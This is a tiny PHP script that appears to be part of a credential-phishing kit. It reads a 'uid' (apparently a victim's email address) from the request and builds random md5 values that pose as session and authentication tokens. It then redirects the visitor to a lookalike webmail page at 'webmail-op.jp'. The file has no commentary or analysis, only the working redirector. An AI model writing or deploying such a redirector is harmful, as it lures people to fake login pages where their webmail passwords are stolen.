<?php
$uid = $_REQUEST['uid'];
$praga=rand();
$praga=md5($praga);

header("location: webmail-op.jp/?cgitoken=submit_authentication&id=$praga$praga&session=$praga$praga&uid=$uid&idd=$praga");

?>